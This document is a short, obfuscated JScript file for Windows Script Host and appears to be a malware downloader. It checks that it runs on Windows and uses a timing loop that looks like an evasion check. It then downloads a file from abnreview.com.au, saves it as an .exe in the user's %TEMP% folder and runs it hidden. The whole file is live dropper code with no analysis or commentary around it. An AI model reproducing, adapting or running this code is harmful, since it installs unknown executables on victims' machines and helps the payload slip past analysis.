var X = false;
var HP = "Create"+"Object";
var X0 = function CO() {return WScript[HP]("WScript"+".Shell");}(), S = 11;
var T0 = "MSXML2"+".XMLHTTP";
var I = 2;
var JD = I - 2;
function J(RT){X0["Run"](RT, JD, JD);};
function VR(){return T0 + "";};
function F(T1, EY){JD = JD * 1; return T1 - EY;};
function BE(){return HP;};
/*@cc_on
  @if (@_win32 || @_win64)
    X = true;
  @end
@*/
if (X)
{
var AO = "";
function XG(){return 22;};
var B = 0; var IT = 0;
function IV()
{
var AN = new this["Date"]();
var CF = AN["getUTCMilliseconds"]();
WScript["Sleep"](XG());
var AN = new this["Date"]();
var PA = AN["getUTCMilliseconds"]();
WScript["Sleep"](XG());
var AN = new this["Date"]();
var W = AN["getUTCMilliseconds"]();
var B = "SE";
B = F(PA, CF);
var IT = "LQ";
IT = F(W, PA);
AO = "open";
return F(B, IT);
}
var B0 = false;
var E = false;
for (var EE = JD; EE < XG() * 1; EE++){if (IV() != JD){
B0 = true; 
IT = "31" + 11 * B + IT; 
E = true; 
break;
}}
function HL() {return ((B0 == true) && (B0 == E)) ? 1 : JD;};
if (B0 && HL() && E){
function EA() {return X0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "0nvsrKPr2CBpgnzj.ex" + "e";};
 RY = VR();
 QU = WScript[HP](RY);
 var A = 1;
do { 
	for (;A;){
	try {
		if (A == 1)
		{
			QU[AO]("GET", "http://abnreview.com.au/j7dsa", false);
			QU["send"]();
			OQ = "Sleep";
			A = 2;
		}
		WScript[OQ](XG() + 120); 
		if (QU["readystate"] < 2 * 2) continue;
		A = JD;
		function L(F0) {var R = (1, 2, 3, 4, 5, F0); return R;};
		M = WScript[BE()]("ADODB.Stream");
		RY = M;
		RY[AO]();
		RY["type"] = L(1);
		RY["write"](QU["ResponseBody"]);
		M["position"] = L(JD);
		RY["Save" + "ToFile"](EA(), 2);
		M["cl"+"ose"]();
		T = EA();
		J(T);
	} catch(NT){};};
}while (A);
}
}

